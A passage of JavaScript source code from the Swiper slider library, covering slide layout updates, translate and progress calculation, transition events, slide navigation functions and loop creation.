    swiper.snapGrid = swiper.snapGrid.map(v => v + addToSnapGrid);
    swiper.slidesGrid = swiper.slidesGrid.map(v => v + addToSlidesGrid);
  }

  if (slidesLength !== previousSlidesLength) {
    swiper.emit('slidesLengthChange');
  }

  if (snapGrid.length !== previousSnapGridLength) {
    if (swiper.params.watchOverflow) swiper.checkOverflow();
    swiper.emit('snapGridLengthChange');
  }

  if (slidesGrid.length !== previousSlidesGridLength) {
    swiper.emit('slidesGridLengthChange');
  }

  if (params.watchSlidesProgress) {
    swiper.updateSlidesOffset();
  }

  if (!isVirtual && !params.cssMode && (params.effect === 'slide' || params.effect === 'fade')) {
    const backFaceHiddenClass = `${params.containerModifierClass}backface-hidden`;
    const hasClassBackfaceClassAdded = swiper.$el.hasClass(backFaceHiddenClass);

    if (slidesLength <= params.maxBackfaceHiddenSlides) {
      if (!hasClassBackfaceClassAdded) swiper.$el.addClass(backFaceHiddenClass);
    } else if (hasClassBackfaceClassAdded) {
      swiper.$el.removeClass(backFaceHiddenClass);
    }
  }
}

function updateAutoHeight(speed) {
  const swiper = this;
  const activeSlides = [];
  const isVirtual = swiper.virtual && swiper.params.virtual.enabled;
  let newHeight = 0;
  let i;

  if (typeof speed === 'number') {
    swiper.setTransition(speed);
  } else if (speed === true) {
    swiper.setTransition(swiper.params.speed);
  }

  const getSlideByIndex = index => {
    if (isVirtual) {
      return swiper.slides.filter(el => parseInt(el.getAttribute('data-swiper-slide-index'), 10) === index)[0];
    }

    return swiper.slides.eq(index)[0];
  }; // Find slides currently in view


  if (swiper.params.slidesPerView !== 'auto' && swiper.params.slidesPerView > 1) {
    if (swiper.params.centeredSlides) {
      (swiper.visibleSlides || $([])).each(slide => {
        activeSlides.push(slide);
      });
    } else {
      for (i = 0; i < Math.ceil(swiper.params.slidesPerView); i += 1) {
        const index = swiper.activeIndex + i;
        if (index > swiper.slides.length && !isVirtual) break;
        activeSlides.push(getSlideByIndex(index));
      }
    }
  } else {
    activeSlides.push(getSlideByIndex(swiper.activeIndex));
  } // Find new height from highest slide in view


  for (i = 0; i < activeSlides.length; i += 1) {
    if (typeof activeSlides[i] !== 'undefined') {
      const height = activeSlides[i].offsetHeight;
      newHeight = height > newHeight ? height : newHeight;
    }
  } // Update Height


  if (newHeight || newHeight === 0) swiper.$wrapperEl.css('height', `${newHeight}px`);
}

function updateSlidesOffset() {
  const swiper = this;
  const slides = swiper.slides;

  for (let i = 0; i < slides.length; i += 1) {
    slides[i].swiperSlideOffset = swiper.isHorizontal() ? slides[i].offsetLeft : slides[i].offsetTop;
  }
}

function updateSlidesProgress(translate = this && this.translate || 0) {
  const swiper = this;
  const params = swiper.params;
  const {
    slides,
    rtlTranslate: rtl,
    snapGrid
  } = swiper;
  if (slides.length === 0) return;
  if (typeof slides[0].swiperSlideOffset === 'undefined') swiper.updateSlidesOffset();
  let offsetCenter = -translate;
  if (rtl) offsetCenter = translate; // Visible Slides

  slides.removeClass(params.slideVisibleClass);
  swiper.visibleSlidesIndexes = [];
  swiper.visibleSlides = [];

  for (let i = 0; i < slides.length; i += 1) {
    const slide = slides[i];
    let slideOffset = slide.swiperSlideOffset;

    if (params.cssMode && params.centeredSlides) {
      slideOffset -= slides[0].swiperSlideOffset;
    }

    const slideProgress = (offsetCenter + (params.centeredSlides ? swiper.minTranslate() : 0) - slideOffset) / (slide.swiperSlideSize + params.spaceBetween);
    const originalSlideProgress = (offsetCenter - snapGrid[0] + (params.centeredSlides ? swiper.minTranslate() : 0) - slideOffset) / (slide.swiperSlideSize + params.spaceBetween);
    const slideBefore = -(offsetCenter - slideOffset);
    const slideAfter = slideBefore + swiper.slidesSizesGrid[i];
    const isVisible = slideBefore >= 0 && slideBefore < swiper.size - 1 || slideAfter > 1 && slideAfter <= swiper.size || slideBefore <= 0 && slideAfter >= swiper.size;

    if (isVisible) {
      swiper.visibleSlides.push(slide);
      swiper.visibleSlidesIndexes.push(i);
      slides.eq(i).addClass(params.slideVisibleClass);
    }

    slide.progress = rtl ? -slideProgress : slideProgress;
    slide.originalProgress = rtl ? -originalSlideProgress : originalSlideProgress;
  }

  swiper.visibleSlides = $(swiper.visibleSlides);
}

function updateProgress(translate) {
  const swiper = this;

  if (typeof translate === 'undefined') {
    const multiplier = swiper.rtlTranslate ? -1 : 1; // eslint-disable-next-line

    translate = swiper && swiper.translate && swiper.translate * multiplier || 0;
  }

  const params = swiper.params;
  const translatesDiff = swiper.maxTranslate() - swiper.minTranslate();
  let {
    progress,
    isBeginning,
    isEnd
  } = swiper;
  const wasBeginning = isBeginning;
  const wasEnd = isEnd;

  if (translatesDiff === 0) {
    progress = 0;
    isBeginning = true;
    isEnd = true;
  } else {
    progress = (translate - swiper.minTranslate()) / translatesDiff;
    isBeginning = progress <= 0;
    isEnd = progress >= 1;
  }

  Object.assign(swiper, {
    progress,
    isBeginning,
    isEnd
  });
  if (params.watchSlidesProgress || params.centeredSlides && params.autoHeight) swiper.updateSlidesProgress(translate);

  if (isBeginning && !wasBeginning) {
    swiper.emit('reachBeginning toEdge');
  }

  if (isEnd && !wasEnd) {
    swiper.emit('reachEnd toEdge');
  }

  if (wasBeginning && !isBeginning || wasEnd && !isEnd) {
    swiper.emit('fromEdge');
  }

  swiper.emit('progress', progress);
}

function updateSlidesClasses() {
  const swiper = this;
  const {
    slides,
    params,
    $wrapperEl,
    activeIndex,
    realIndex
  } = swiper;
  const isVirtual = swiper.virtual && params.virtual.enabled;
  slides.removeClass(`${params.slideActiveClass} ${params.slideNextClass} ${params.slidePrevClass} ${params.slideDuplicateActiveClass} ${params.slideDuplicateNextClass} ${params.slideDuplicatePrevClass}`);
  let activeSlide;

  if (isVirtual) {
    activeSlide = swiper.$wrapperEl.find(`.${params.slideClass}[data-swiper-slide-index="${activeIndex}"]`);
  } else {
    activeSlide = slides.eq(activeIndex);
  } // Active classes


  activeSlide.addClass(params.slideActiveClass);

  if (params.loop) {
    // Duplicate to all looped slides
    if (activeSlide.hasClass(params.slideDuplicateClass)) {
      $wrapperEl.children(`.${params.slideClass}:not(.${params.slideDuplicateClass})[data-swiper-slide-index="${realIndex}"]`).addClass(params.slideDuplicateActiveClass);
    } else {
      $wrapperEl.children(`.${params.slideClass}.${params.slideDuplicateClass}[data-swiper-slide-index="${realIndex}"]`).addClass(params.slideDuplicateActiveClass);
    }
  } // Next Slide


  let nextSlide = activeSlide.nextAll(`.${params.slideClass}`).eq(0).addClass(params.slideNextClass);

  if (params.loop && nextSlide.length === 0) {
    nextSlide = slides.eq(0);
    nextSlide.addClass(params.slideNextClass);
  } // Prev Slide


  let prevSlide = activeSlide.prevAll(`.${params.slideClass}`).eq(0).addClass(params.slidePrevClass);

  if (params.loop && prevSlide.length === 0) {
    prevSlide = slides.eq(-1);
    prevSlide.addClass(params.slidePrevClass);
  }

  if (params.loop) {
    // Duplicate to all looped slides
    if (nextSlide.hasClass(params.slideDuplicateClass)) {
      $wrapperEl.children(`.${params.slideClass}:not(.${params.slideDuplicateClass})[data-swiper-slide-index="${nextSlide.attr('data-swiper-slide-index')}"]`).addClass(params.slideDuplicateNextClass);
    } else {
      $wrapperEl.children(`.${params.slideClass}.${params.slideDuplicateClass}[data-swiper-slide-index="${nextSlide.attr('data-swiper-slide-index')}"]`).addClass(params.slideDuplicateNextClass);
    }

    if (prevSlide.hasClass(params.slideDuplicateClass)) {
      $wrapperEl.children(`.${params.slideClass}:not(.${params.slideDuplicateClass})[data-swiper-slide-index="${prevSlide.attr('data-swiper-slide-index')}"]`).addClass(params.slideDuplicatePrevClass);
    } else {
      $wrapperEl.children(`.${params.slideClass}.${params.slideDuplicateClass}[data-swiper-slide-index="${prevSlide.attr('data-swiper-slide-index')}"]`).addClass(params.slideDuplicatePrevClass);
    }
  }

  swiper.emitSlidesClasses();
}

function updateActiveIndex(newActiveIndex) {
  const swiper = this;
  const translate = swiper.rtlTranslate ? swiper.translate : -swiper.translate;
  const {
    slidesGrid,
    snapGrid,
    params,
    activeIndex: previousIndex,
    realIndex: previousRealIndex,
    snapIndex: previousSnapIndex
  } = swiper;
  let activeIndex = newActiveIndex;
  let snapIndex;

  if (typeof activeIndex === 'undefined') {
    for (let i = 0; i < slidesGrid.length; i += 1) {
      if (typeof slidesGrid[i + 1] !== 'undefined') {
        if (translate >= slidesGrid[i] && translate < slidesGrid[i + 1] - (slidesGrid[i + 1] - slidesGrid[i]) / 2) {
          activeIndex = i;
        } else if (translate >= slidesGrid[i] && translate < slidesGrid[i + 1]) {
          activeIndex = i + 1;
        }
      } else if (translate >= slidesGrid[i]) {
        activeIndex = i;
      }
    } // Normalize slideIndex


    if (params.normalizeSlideIndex) {
      if (activeIndex < 0 || typeof activeIndex === 'undefined') activeIndex = 0;
    }
  }

  if (snapGrid.indexOf(translate) >= 0) {
    snapIndex = snapGrid.indexOf(translate);
  } else {
    const skip = Math.min(params.slidesPerGroupSkip, activeIndex);
    snapIndex = skip + Math.floor((activeIndex - skip) / params.slidesPerGroup);
  }

  if (snapIndex >= snapGrid.length) snapIndex = snapGrid.length - 1;

  if (activeIndex === previousIndex) {
    if (snapIndex !== previousSnapIndex) {
      swiper.snapIndex = snapIndex;
      swiper.emit('snapIndexChange');
    }

    return;
  } // Get real index


  const realIndex = parseInt(swiper.slides.eq(activeIndex).attr('data-swiper-slide-index') || activeIndex, 10);
  Object.assign(swiper, {
    snapIndex,
    realIndex,
    previousIndex,
    activeIndex
  });
  swiper.emit('activeIndexChange');
  swiper.emit('snapIndexChange');

  if (previousRealIndex !== realIndex) {
    swiper.emit('realIndexChange');
  }

  if (swiper.initialized || swiper.params.runCallbacksOnInit) {
    swiper.emit('slideChange');
  }
}

function updateClickedSlide(e) {
  const swiper = this;
  const params = swiper.params;
  const slide = $(e).closest(`.${params.slideClass}`)[0];
  let slideFound = false;
  let slideIndex;

  if (slide) {
    for (let i = 0; i < swiper.slides.length; i += 1) {
      if (swiper.slides[i] === slide) {
        slideFound = true;
        slideIndex = i;
        break;
      }
    }
  }

  if (slide && slideFound) {
    swiper.clickedSlide = slide;

    if (swiper.virtual && swiper.params.virtual.enabled) {
      swiper.clickedIndex = parseInt($(slide).attr('data-swiper-slide-index'), 10);
    } else {
      swiper.clickedIndex = slideIndex;
    }
  } else {
    swiper.clickedSlide = undefined;
    swiper.clickedIndex = undefined;
    return;
  }

  if (params.slideToClickedSlide && swiper.clickedIndex !== undefined && swiper.clickedIndex !== swiper.activeIndex) {
    swiper.slideToClickedSlide();
  }
}

var update = {
  updateSize,
  updateSlides,
  updateAutoHeight,
  updateSlidesOffset,
  updateSlidesProgress,
  updateProgress,
  updateSlidesClasses,
  updateActiveIndex,
  updateClickedSlide
};

function getSwiperTranslate(axis = this.isHorizontal() ? 'x' : 'y') {
  const swiper = this;
  const {
    params,
    rtlTranslate: rtl,
    translate,
    $wrapperEl
  } = swiper;

  if (params.virtualTranslate) {
    return rtl ? -translate : translate;
  }

  if (params.cssMode) {
    return translate;
  }

  let currentTranslate = getTranslate($wrapperEl[0], axis);
  if (rtl) currentTranslate = -currentTranslate;
  return currentTranslate || 0;
}

function setTranslate(translate, byController) {
  const swiper = this;
  const {
    rtlTranslate: rtl,
    params,
    $wrapperEl,
    wrapperEl,
    progress
  } = swiper;
  let x = 0;
  let y = 0;
  const z = 0;

  if (swiper.isHorizontal()) {
    x = rtl ? -translate : translate;
  } else {
    y = translate;
  }

  if (params.roundLengths) {
    x = Math.floor(x);
    y = Math.floor(y);
  }

  if (params.cssMode) {
    wrapperEl[swiper.isHorizontal() ? 'scrollLeft' : 'scrollTop'] = swiper.isHorizontal() ? -x : -y;
  } else if (!params.virtualTranslate) {
    $wrapperEl.transform(`translate3d(${x}px, ${y}px, ${z}px)`);
  }

  swiper.previousTranslate = swiper.translate;
  swiper.translate = swiper.isHorizontal() ? x : y; // Check if we need to update progress

  let newProgress;
  const translatesDiff = swiper.maxTranslate() - swiper.minTranslate();

  if (translatesDiff === 0) {
    newProgress = 0;
  } else {
    newProgress = (translate - swiper.minTranslate()) / translatesDiff;
  }

  if (newProgress !== progress) {
    swiper.updateProgress(translate);
  }

  swiper.emit('setTranslate', swiper.translate, byController);
}

function minTranslate() {
  return -this.snapGrid[0];
}

function maxTranslate() {
  return -this.snapGrid[this.snapGrid.length - 1];
}

function translateTo(translate = 0, speed = this.params.speed, runCallbacks = true, translateBounds = true, internal) {
  const swiper = this;
  const {
    params,
    wrapperEl
  } = swiper;

  if (swiper.animating && params.preventInteractionOnTransition) {
    return false;
  }

  const minTranslate = swiper.minTranslate();
  const maxTranslate = swiper.maxTranslate();
  let newTranslate;
  if (translateBounds && translate > minTranslate) newTranslate = minTranslate;else if (translateBounds && translate < maxTranslate) newTranslate = maxTranslate;else newTranslate = translate; // Update progress

  swiper.updateProgress(newTranslate);

  if (params.cssMode) {
    const isH = swiper.isHorizontal();

    if (speed === 0) {
      wrapperEl[isH ? 'scrollLeft' : 'scrollTop'] = -newTranslate;
    } else {
      if (!swiper.support.smoothScroll) {
        animateCSSModeScroll({
          swiper,
          targetPosition: -newTranslate,
          side: isH ? 'left' : 'top'
        });
        return true;
      }

      wrapperEl.scrollTo({
        [isH ? 'left' : 'top']: -newTranslate,
        behavior: 'smooth'
      });
    }

    return true;
  }

  if (speed === 0) {
    swiper.setTransition(0);
    swiper.setTranslate(newTranslate);

    if (runCallbacks) {
      swiper.emit('beforeTransitionStart', speed, internal);
      swiper.emit('transitionEnd');
    }
  } else {
    swiper.setTransition(speed);
    swiper.setTranslate(newTranslate);

    if (runCallbacks) {
      swiper.emit('beforeTransitionStart', speed, internal);
      swiper.emit('transitionStart');
    }

    if (!swiper.animating) {
      swiper.animating = true;

      if (!swiper.onTranslateToWrapperTransitionEnd) {
        swiper.onTranslateToWrapperTransitionEnd = function transitionEnd(e) {
          if (!swiper || swiper.destroyed) return;
          if (e.target !== this) return;
          swiper.$wrapperEl[0].removeEventListener('transitionend', swiper.onTranslateToWrapperTransitionEnd);
          swiper.$wrapperEl[0].removeEventListener('webkitTransitionEnd', swiper.onTranslateToWrapperTransitionEnd);
          swiper.onTranslateToWrapperTransitionEnd = null;
          delete swiper.onTranslateToWrapperTransitionEnd;

          if (runCallbacks) {
            swiper.emit('transitionEnd');
          }
        };
      }

      swiper.$wrapperEl[0].addEventListener('transitionend', swiper.onTranslateToWrapperTransitionEnd);
      swiper.$wrapperEl[0].addEventListener('webkitTransitionEnd', swiper.onTranslateToWrapperTransitionEnd);
    }
  }

  return true;
}

var translate = {
  getTranslate: getSwiperTranslate,
  setTranslate,
  minTranslate,
  maxTranslate,
  translateTo
};

function setTransition(duration, byController) {
  const swiper = this;

  if (!swiper.params.cssMode) {
    swiper.$wrapperEl.transition(duration);
  }

  swiper.emit('setTransition', duration, byController);
}

function transitionEmit({
  swiper,
  runCallbacks,
  direction,
  step
}) {
  const {
    activeIndex,
    previousIndex
  } = swiper;
  let dir = direction;

  if (!dir) {
    if (activeIndex > previousIndex) dir = 'next';else if (activeIndex < previousIndex) dir = 'prev';else dir = 'reset';
  }

  swiper.emit(`transition${step}`);

  if (runCallbacks && activeIndex !== previousIndex) {
    if (dir === 'reset') {
      swiper.emit(`slideResetTransition${step}`);
      return;
    }

    swiper.emit(`slideChangeTransition${step}`);

    if (dir === 'next') {
      swiper.emit(`slideNextTransition${step}`);
    } else {
      swiper.emit(`slidePrevTransition${step}`);
    }
  }
}

function transitionStart(runCallbacks = true, direction) {
  const swiper = this;
  const {
    params
  } = swiper;
  if (params.cssMode) return;

  if (params.autoHeight) {
    swiper.updateAutoHeight();
  }

  transitionEmit({
    swiper,
    runCallbacks,
    direction,
    step: 'Start'
  });
}

function transitionEnd(runCallbacks = true, direction) {
  const swiper = this;
  const {
    params
  } = swiper;
  swiper.animating = false;
  if (params.cssMode) return;
  swiper.setTransition(0);
  transitionEmit({
    swiper,
    runCallbacks,
    direction,
    step: 'End'
  });
}

var transition = {
  setTransition,
  transitionStart,
  transitionEnd
};

function slideTo(index = 0, speed = this.params.speed, runCallbacks = true, internal, initial) {
  if (typeof index !== 'number' && typeof index !== 'string') {
    throw new Error(`The 'index' argument cannot have type other than 'number' or 'string'. [${typeof index}] given.`);
  }

  if (typeof index === 'string') {
    /**
     * The `index` argument converted from `string` to `number`.
     * @type {number}
     */
    const indexAsNumber = parseInt(index, 10);
    /**
     * Determines whether the `index` argument is a valid `number`
     * after being converted from the `string` type.
     * @type {boolean}
     */

    const isValidNumber = isFinite(indexAsNumber);

    if (!isValidNumber) {
      throw new Error(`The passed-in 'index' (string) couldn't be converted to 'number'. [${index}] given.`);
    } // Knowing that the converted `index` is a valid number,
    // we can update the original argument's value.


    index = indexAsNumber;
  }

  const swiper = this;
  let slideIndex = index;
  if (slideIndex < 0) slideIndex = 0;
  const {
    params,
    snapGrid,
    slidesGrid,
    previousIndex,
    activeIndex,
    rtlTranslate: rtl,
    wrapperEl,
    enabled
  } = swiper;

  if (swiper.animating && params.preventInteractionOnTransition || !enabled && !internal && !initial) {
    return false;
  }

  const skip = Math.min(swiper.params.slidesPerGroupSkip, slideIndex);
  let snapIndex = skip + Math.floor((slideIndex - skip) / swiper.params.slidesPerGroup);
  if (snapIndex >= snapGrid.length) snapIndex = snapGrid.length - 1;
  const translate = -snapGrid[snapIndex]; // Normalize slideIndex

  if (params.normalizeSlideIndex) {
    for (let i = 0; i < slidesGrid.length; i += 1) {
      const normalizedTranslate = -Math.floor(translate * 100);
      const normalizedGrid = Math.floor(slidesGrid[i] * 100);
      const normalizedGridNext = Math.floor(slidesGrid[i + 1] * 100);

      if (typeof slidesGrid[i + 1] !== 'undefined') {
        if (normalizedTranslate >= normalizedGrid && normalizedTranslate < normalizedGridNext - (normalizedGridNext - normalizedGrid) / 2) {
          slideIndex = i;
        } else if (normalizedTranslate >= normalizedGrid && normalizedTranslate < normalizedGridNext) {
          slideIndex = i + 1;
        }
      } else if (normalizedTranslate >= normalizedGrid) {
        slideIndex = i;
      }
    }
  } // Directions locks


  if (swiper.initialized && slideIndex !== activeIndex) {
    if (!swiper.allowSlideNext && translate < swiper.translate && translate < swiper.minTranslate()) {
      return false;
    }

    if (!swiper.allowSlidePrev && translate > swiper.translate && translate > swiper.maxTranslate()) {
      if ((activeIndex || 0) !== slideIndex) return false;
    }
  }

  if (slideIndex !== (previousIndex || 0) && runCallbacks) {
    swiper.emit('beforeSlideChangeStart');
  } // Update progress


  swiper.updateProgress(translate);
  let direction;
  if (slideIndex > activeIndex) direction = 'next';else if (slideIndex < activeIndex) direction = 'prev';else direction = 'reset'; // Update Index

  if (rtl && -translate === swiper.translate || !rtl && translate === swiper.translate) {
    swiper.updateActiveIndex(slideIndex); // Update Height

    if (params.autoHeight) {
      swiper.updateAutoHeight();
    }

    swiper.updateSlidesClasses();

    if (params.effect !== 'slide') {
      swiper.setTranslate(translate);
    }

    if (direction !== 'reset') {
      swiper.transitionStart(runCallbacks, direction);
      swiper.transitionEnd(runCallbacks, direction);
    }

    return false;
  }

  if (params.cssMode) {
    const isH = swiper.isHorizontal();
    const t = rtl ? translate : -translate;

    if (speed === 0) {
      const isVirtual = swiper.virtual && swiper.params.virtual.enabled;

      if (isVirtual) {
        swiper.wrapperEl.style.scrollSnapType = 'none';
        swiper._immediateVirtual = true;
      }

      wrapperEl[isH ? 'scrollLeft' : 'scrollTop'] = t;

      if (isVirtual) {
        requestAnimationFrame(() => {
          swiper.wrapperEl.style.scrollSnapType = '';
          swiper._swiperImmediateVirtual = false;
        });
      }
    } else {
      if (!swiper.support.smoothScroll) {
        animateCSSModeScroll({
          swiper,
          targetPosition: t,
          side: isH ? 'left' : 'top'
        });
        return true;
      }

      wrapperEl.scrollTo({
        [isH ? 'left' : 'top']: t,
        behavior: 'smooth'
      });
    }

    return true;
  }

  swiper.setTransition(speed);
  swiper.setTranslate(translate);
  swiper.updateActiveIndex(slideIndex);
  swiper.updateSlidesClasses();
  swiper.emit('beforeTransitionStart', speed, internal);
  swiper.transitionStart(runCallbacks, direction);

  if (speed === 0) {
    swiper.transitionEnd(runCallbacks, direction);
  } else if (!swiper.animating) {
    swiper.animating = true;

    if (!swiper.onSlideToWrapperTransitionEnd) {
      swiper.onSlideToWrapperTransitionEnd = function transitionEnd(e) {
        if (!swiper || swiper.destroyed) return;
        if (e.target !== this) return;
        swiper.$wrapperEl[0].removeEventListener('transitionend', swiper.onSlideToWrapperTransitionEnd);
        swiper.$wrapperEl[0].removeEventListener('webkitTransitionEnd', swiper.onSlideToWrapperTransitionEnd);
        swiper.onSlideToWrapperTransitionEnd = null;
        delete swiper.onSlideToWrapperTransitionEnd;
        swiper.transitionEnd(runCallbacks, direction);
      };
    }

    swiper.$wrapperEl[0].addEventListener('transitionend', swiper.onSlideToWrapperTransitionEnd);
    swiper.$wrapperEl[0].addEventListener('webkitTransitionEnd', swiper.onSlideToWrapperTransitionEnd);
  }

  return true;
}

function slideToLoop(index = 0, speed = this.params.speed, runCallbacks = true, internal) {
  if (typeof index === 'string') {
    /**
     * The `index` argument converted from `string` to `number`.
     * @type {number}
     */
    const indexAsNumber = parseInt(index, 10);
    /**
     * Determines whether the `index` argument is a valid `number`
     * after being converted from the `string` type.
     * @type {boolean}
     */

    const isValidNumber = isFinite(indexAsNumber);

    if (!isValidNumber) {
      throw new Error(`The passed-in 'index' (string) couldn't be converted to 'number'. [${index}] given.`);
    } // Knowing that the converted `index` is a valid number,
    // we can update the original argument's value.


    index = indexAsNumber;
  }

  const swiper = this;
  let newIndex = index;

  if (swiper.params.loop) {
    newIndex += swiper.loopedSlides;
  }

  return swiper.slideTo(newIndex, speed, runCallbacks, internal);
}

/* eslint no-unused-vars: "off" */
function slideNext(speed = this.params.speed, runCallbacks = true, internal) {
  const swiper = this;
  const {
    animating,
    enabled,
    params
  } = swiper;
  if (!enabled) return swiper;
  let perGroup = params.slidesPerGroup;

  if (params.slidesPerView === 'auto' && params.slidesPerGroup === 1 && params.slidesPerGroupAuto) {
    perGroup = Math.max(swiper.slidesPerViewDynamic('current', true), 1);
  }

  const increment = swiper.activeIndex < params.slidesPerGroupSkip ? 1 : perGroup;

  if (params.loop) {
    if (animating && params.loopPreventsSlide) return false;
    swiper.loopFix(); // eslint-disable-next-line

    swiper._clientLeft = swiper.$wrapperEl[0].clientLeft;
  }

  if (params.rewind && swiper.isEnd) {
    return swiper.slideTo(0, speed, runCallbacks, internal);
  }

  return swiper.slideTo(swiper.activeIndex + increment, speed, runCallbacks, internal);
}

/* eslint no-unused-vars: "off" */
function slidePrev(speed = this.params.speed, runCallbacks = true, internal) {
  const swiper = this;
  const {
    params,
    animating,
    snapGrid,
    slidesGrid,
    rtlTranslate,
    enabled
  } = swiper;
  if (!enabled) return swiper;

  if (params.loop) {
    if (animating && params.loopPreventsSlide) return false;
    swiper.loopFix(); // eslint-disable-next-line

    swiper._clientLeft = swiper.$wrapperEl[0].clientLeft;
  }

  const translate = rtlTranslate ? swiper.translate : -swiper.translate;

  function normalize(val) {
    if (val < 0) return -Math.floor(Math.abs(val));
    return Math.floor(val);
  }

  const normalizedTranslate = normalize(translate);
  const normalizedSnapGrid = snapGrid.map(val => normalize(val));
  let prevSnap = snapGrid[normalizedSnapGrid.indexOf(normalizedTranslate) - 1];

  if (typeof prevSnap === 'undefined' && params.cssMode) {
    let prevSnapIndex;
    snapGrid.forEach((snap, snapIndex) => {
      if (normalizedTranslate >= snap) {
        // prevSnap = snap;
        prevSnapIndex = snapIndex;
      }
    });

    if (typeof prevSnapIndex !== 'undefined') {
      prevSnap = snapGrid[prevSnapIndex > 0 ? prevSnapIndex - 1 : prevSnapIndex];
    }
  }

  let prevIndex = 0;

  if (typeof prevSnap !== 'undefined') {
    prevIndex = slidesGrid.indexOf(prevSnap);
    if (prevIndex < 0) prevIndex = swiper.activeIndex - 1;

    if (params.slidesPerView === 'auto' && params.slidesPerGroup === 1 && params.slidesPerGroupAuto) {
      prevIndex = prevIndex - swiper.slidesPerViewDynamic('previous', true) + 1;
      prevIndex = Math.max(prevIndex, 0);
    }
  }

  if (params.rewind && swiper.isBeginning) {
    const lastIndex = swiper.params.virtual && swiper.params.virtual.enabled && swiper.virtual ? swiper.virtual.slides.length - 1 : swiper.slides.length - 1;
    return swiper.slideTo(lastIndex, speed, runCallbacks, internal);
  }

  return swiper.slideTo(prevIndex, speed, runCallbacks, internal);
}

/* eslint no-unused-vars: "off" */
function slideReset(speed = this.params.speed, runCallbacks = true, internal) {
  const swiper = this;
  return swiper.slideTo(swiper.activeIndex, speed, runCallbacks, internal);
}

/* eslint no-unused-vars: "off" */
function slideToClosest(speed = this.params.speed, runCallbacks = true, internal, threshold = 0.5) {
  const swiper = this;
  let index = swiper.activeIndex;
  const skip = Math.min(swiper.params.slidesPerGroupSkip, index);
  const snapIndex = skip + Math.floor((index - skip) / swiper.params.slidesPerGroup);
  const translate = swiper.rtlTranslate ? swiper.translate : -swiper.translate;

  if (translate >= swiper.snapGrid[snapIndex]) {
    // The current translate is on or after the current snap index, so the choice
    // is between the current index and the one after it.
    const currentSnap = swiper.snapGrid[snapIndex];
    const nextSnap = swiper.snapGrid[snapIndex + 1];

    if (translate - currentSnap > (nextSnap - currentSnap) * threshold) {
      index += swiper.params.slidesPerGroup;
    }
  } else {
    // The current translate is before the current snap index, so the choice
    // is between the current index and the one before it.
    const prevSnap = swiper.snapGrid[snapIndex - 1];
    const currentSnap = swiper.snapGrid[snapIndex];

    if (translate - prevSnap <= (currentSnap - prevSnap) * threshold) {
      index -= swiper.params.slidesPerGroup;
    }
  }

  index = Math.max(index, 0);
  index = Math.min(index, swiper.slidesGrid.length - 1);
  return swiper.slideTo(index, speed, runCallbacks, internal);
}

function slideToClickedSlide() {
  const swiper = this;
  const {
    params,
    $wrapperEl
  } = swiper;
  const slidesPerView = params.slidesPerView === 'auto' ? swiper.slidesPerViewDynamic() : params.slidesPerView;
  let slideToIndex = swiper.clickedIndex;
  let realIndex;

  if (params.loop) {
    if (swiper.animating) return;
    realIndex = parseInt($(swiper.clickedSlide).attr('data-swiper-slide-index'), 10);

    if (params.centeredSlides) {
      if (slideToIndex < swiper.loopedSlides - slidesPerView / 2 || slideToIndex > swiper.slides.length - swiper.loopedSlides + slidesPerView / 2) {
        swiper.loopFix();
        slideToIndex = $wrapperEl.children(`.${params.slideClass}[data-swiper-slide-index="${realIndex}"]:not(.${params.slideDuplicateClass})`).eq(0).index();
        nextTick(() => {
          swiper.slideTo(slideToIndex);
        });
      } else {
        swiper.slideTo(slideToIndex);
      }
    } else if (slideToIndex > swiper.slides.length - slidesPerView) {
      swiper.loopFix();
      slideToIndex = $wrapperEl.children(`.${params.slideClass}[data-swiper-slide-index="${realIndex}"]:not(.${params.slideDuplicateClass})`).eq(0).index();
      nextTick(() => {
        swiper.slideTo(slideToIndex);
      });
    } else {
      swiper.slideTo(slideToIndex);
    }
  } else {
    swiper.slideTo(slideToIndex);
  }
}

var slide = {
  slideTo,
  slideToLoop,
  slideNext,
  slidePrev,
  slideReset,
  slideToClosest,
  slideToClickedSlide
};

function loopCreate() {
  const swiper = this;
  const document = getDocument();
  const {
    params,
    $wrapperEl
  } = swiper; // Remove duplicated slides

  const $selector = $wrapperEl.children().length > 0 ? $($wrapperEl.children()[0].parentNode) : $wrapperEl;
  $selector.children(`.${params.slideClass}.${params.slideDuplicateClass}`).remove();
  let slides = $selector.children(`.${params.slideClass}`);

  if (params.loopFillGroupWithBlank) {
    const blankSlidesNum = params.slidesPerGroup - slides.length % params.slidesPerGroup;

    if (blankSlidesNum !== params.slidesPerGroup) {
      for (let i = 0; i < blankSlidesNum; i += 1) {
        const blankNode = $(document.createElement('div')).addClass(`${params.slideClass} ${params.slideBlankClass}`);
        $selector.append(blankNode);
      }

      slides = $selector.children(`.${params.slideClass}`);
    }
  }

  if (params.slidesPerView === 'auto' && !params.loopedSlides) params.loopedSlides = slides.length;
  swiper.loopedSlides = Math.ceil(parseFloat(params.loopedSlides || params.slidesPerView, 10));
  swiper.loopedSlides += params.loopAdditionalSlides;

  if (swiper.loopedSlides > slides.length && swiper.params.loopedSlidesLimit) {
    swiper.loopedSlides = slides.length;
  }

  const prependSlides = [];
  const appendSlides = [];
  slides.each((el, index) => {
    const slide = $(el);
    slide.attr('data-swiper-slide-index', index);
  });

  for (let i = 0; i < swiper.loopedSlides; i += 1) {
    const index = i - Math.floor(i / slides.length) * slides.length;
    appendSlides.push(slides.eq(index)[0]);
    prependSlides.unshift(slides.eq(slides.length - index - 1)[0]);
  }

  for (let i = 0; i < appendSlides.length; i += 1) {
    $selector.append($(appendSlides[i].cloneNode(true)).addClass(params.slideDuplicateClass));
  }

  for (let i = prependSlides.length - 1; i >= 0; i -= 1) {
    $selector.prepend($(prependSlides[i].cloneNode(true)).addClass(params.slideDuplicateClass));
  }
}

function loopFix() {
  const swiper = this;
  swiper.emit('beforeLoopFix');
  const {
    activeIndex,
    slides,
    loopedSlides,
    allowSlidePrev,
    allowSlideNext,
    snapGrid,
    rtlTranslate: rtl
  } = swiper;
  let newIndex;
  swiper.allowSlidePrev = true;
  swiper.allowSlideNext = true;
  const snapTranslate = -snapGrid[activeIndex];
  const diff = snapTranslate - swiper.getTranslate(); // Fix For Negative Oversliding

  if (activeIndex < loopedSlides) {
    newIndex = slides.length - loopedSlides * 3 + activeIndex;
    newIndex += loopedSlides;
    const slideChanged = swiper.slideTo(newIndex, 0, false, true);

    if (slideChanged && diff !== 0) {
      swiper.setTranslate((rtl ? -swiper.translate : swiper.translate) - diff);
    }
  } else if (activeIndex >= slides.length - loopedSlides) {
    // Fix For Positive Oversliding
    newIndex = -slides.length + activeIndex + loopedSlides;
    newIndex += loopedSlides;
    const slideChanged = swiper.slideTo(newIndex, 0, false, true);

